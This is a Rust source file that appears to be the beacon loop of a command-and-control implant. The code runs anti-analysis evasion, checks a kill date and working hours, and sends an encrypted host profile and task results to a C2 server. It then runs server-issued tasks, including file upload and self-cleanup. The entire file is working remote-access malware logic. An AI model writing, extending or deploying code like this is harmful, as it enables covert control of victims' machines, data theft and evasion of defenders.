/// Beacon loop: the agent's main operational cycle.
/// Sleep → collect results → sync with C2 → dispatch new tasks → repeat.

use std::sync::{Arc, Mutex};
use serde::{Deserialize, Serialize};
use serde_json::json;

use crate::config::Config;
use crate::core::{self, TaskResult};
use crate::crypto::aes;
use crate::transport::https;
use crate::utils::helpers;

#[derive(Serialize)]
struct AgentPayload {
    id: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    profile: Option<serde_json::Value>,
    results: Vec<ResultPayload>,
}

#[derive(Serialize)]
struct ResultPayload {
    task_id: i64,
    output: String,
    output_type: String,
    status: String,
}

#[derive(Deserialize)]
struct SyncResponse {
    tasks: Option<Vec<TaskPayload>>,
    config: Option<ConfigUpdate>,
}

#[derive(Deserialize)]
struct TaskPayload {
    id: i64,
    #[serde(rename = "type")]
    task_type: String,
    args: serde_json::Value,
}

#[derive(Deserialize)]
struct ConfigUpdate {
    sleep: Option<u64>,
    jitter: Option<u64>,
}

pub fn run(config: Arc<Config>) {
    let results: Arc<Mutex<Vec<TaskResult>>> = Arc::new(Mutex::new(Vec::new()));
    let mut checkin_count: u64 = 0;
    let mut consecutive_errors: u32 = 0;
    let max_backoff: u64 = 300; // 5 min max backoff on errors

    // Run anti-analysis checks before starting
    #[cfg(feature = "anti_analysis")]
    {
        if crate::utils::anti_analysis::run_checks() {
            // Threat detected — sleep indefinitely
            loop {
                std::thread::sleep(std::time::Duration::from_secs(3600));
            }
        }
    }

    loop {
        // 1. Check killdate
        if config.is_killdate_expired() {
            #[cfg(feature = "cleanup")]
            {
                let _ = core::cleanup::run(0, &serde_json::Value::Null);
            }
            std::process::exit(0);
        }

        // 2. Check working hours
        if !config.is_within_work_hours() {
            std::thread::sleep(std::time::Duration::from_secs(60));
            continue;
        }

        // 3. Collect completed task results
        let pending_results: Vec<TaskResult> = {
            let mut res = results.lock().unwrap();
            std::mem::take(&mut *res)
        };

        let result_payloads: Vec<ResultPayload> = pending_results
            .iter()
            .map(|r| ResultPayload {
                task_id: r.task_id,
                output: r.output.clone(),
                output_type: r.output_type.clone(),
                status: r.status.clone(),
            })
            .collect();

        // 4. Build check-in payload
        let profile = if checkin_count == 0 || checkin_count % 10 == 0 {
            Some(crate::core::host_profile::gather_profile())
        } else {
            None
        };

        let payload = AgentPayload {
            id: config.agent_id.clone(),
            profile,
            results: result_payloads,
        };

        let payload_json = match serde_json::to_vec(&payload) {
            Ok(j) => j,
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(config.get_sleep()));
                continue;
            }
        };

        // 5. Encrypt
        let encrypted = match aes::encrypt(&payload_json, &config.aes_key) {
            Ok(e) => e,
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(config.get_sleep()));
                continue;
            }
        };

        // 6. POST to server
        let response_encrypted = match https::sync_post(&config.server_url, &encrypted) {
            Ok(r) => {
                consecutive_errors = 0;
                r
            }
            Err(_) => {
                // Network error — exponential backoff
                consecutive_errors += 1;
                let backoff = std::cmp::min(
                    config.get_sleep() * 2u64.pow(consecutive_errors.min(6)),
                    max_backoff,
                );
                std::thread::sleep(std::time::Duration::from_secs(backoff));
                continue;
            }
        };

        // 7. Decrypt response
        let response_bytes = match aes::decrypt(&response_encrypted, &config.aes_key) {
            Ok(r) => r,
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(config.get_sleep()));
                continue;
            }
        };

        let response: SyncResponse = match serde_json::from_slice(&response_bytes) {
            Ok(r) => r,
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(config.get_sleep()));
                continue;
            }
        };

        // 8. Process new tasks — spawn each in a thread
        if let Some(tasks) = response.tasks {
            for task in tasks {
                let results_clone = Arc::clone(&results);
                let server_url = config.server_url.clone();
                let agent_id = config.agent_id.clone();

                std::thread::spawn(move || {
                    // Inject server context into storage upload tasks
                    let mut args = task.args.clone();
                    if task.task_type == "storage_upload" {
                        if let Some(obj) = args.as_object_mut() {
                            obj.insert("_server_url".to_string(), json!(server_url));
                            obj.insert("_agent_id".to_string(), json!(agent_id));
                        }
                    }

                    let result = core::dispatch_task(task.id, &task.task_type, &args);

                    let mut res = results_clone.lock().unwrap();
                    res.push(result);
                });

                // Check if this was a cleanup task — if so, we exit after sending the result
                if task.task_type == "cleanup" {
                    // Give the cleanup task a moment to complete
                    std::thread::sleep(std::time::Duration::from_secs(2));
                    std::process::exit(0);
                }
            }
        }

        // 9. Update config if server sent new sleep/jitter
        if let Some(cfg_update) = response.config {
            if let Some(sleep) = cfg_update.sleep {
                if sleep > 0 {
                    config.update_sleep(sleep);
                }
            }
            if let Some(jitter) = cfg_update.jitter {
                config.update_jitter(jitter);
            }
        }

        // 10. Sleep with jitter
        checkin_count += 1;
        let sleep_duration = helpers::sleep_with_jitter(config.get_sleep(), config.get_jitter());
        std::thread::sleep(std::time::Duration::from_secs(sleep_duration));
    }
}
